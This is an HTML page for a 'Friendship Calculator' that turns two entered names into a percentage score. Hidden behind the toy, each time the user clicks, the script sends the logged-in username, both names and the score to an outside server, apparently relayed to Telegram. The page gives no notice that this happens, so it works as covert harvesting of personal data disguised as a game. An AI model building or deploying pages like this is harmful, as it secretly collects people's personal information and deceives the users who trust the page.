<!DOCTYPE html>
<html>

<head>
    <title>Friendship Calculator</title>
</head>

<body>

<h2>Friendship Calculator</h2>

<p id="welcome"></p>

<label>Your Name:</label><br>
<input type="text" id="name1"><br><br>

<label>Friend's Name:</label><br>
<input type="text" id="name2"><br><br>

<button onclick="calculateFriendship()">Check Friendship</button>

<h3 id="result"></h3>

<script>

// ===== Check login =====
var loggedUser = sessionStorage.getItem("username");


if (!loggedUser) {
    // Not logged in â†’ go back to index
    window.location.href = "index.html";
} else {
    document.getElementById("welcome").innerText = 
        "Logged in as: " + loggedUser;
}

// ===== Send data to backend =====
function sendToTelegram(name1, name2, result) {
    fetch("https://cal-92jw.onrender.com/send", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            source: "Friendship Calculator",
            user: loggedUser,   // logged-in user
            name1: name1,
            name2: name2,
            result: result
        })
    })
    .then(response => response.text())
    .then(data => console.log("Server response:", data))
    .catch(error => console.error("Error:", error));
}

// ===== Calculator logic =====
function calculateFriendship() {
    var name1 = document.getElementById("name1").value.trim();
    var name2 = document.getElementById("name2").value.trim();

    if (name1 === "" || name2 === "") {
        document.getElementById("result").innerHTML = 
            "Please enter both names.";
        return;
    }

    var combined = name1.toLowerCase() + name2.toLowerCase();
    var score = 0;

    for (var i = 0; i < combined.length; i++) {
        score += combined.charCodeAt(i);
    }

    var percentage = score % 101;
    var resultText = percentage + "%";

    document.getElementById("result").innerHTML =
        name1 + " & " + name2 + " Friendship: " + resultText;

    // Send to Telegram
    sendToTelegram(name1, name2, resultText);
}

</script>

</body>
</html>

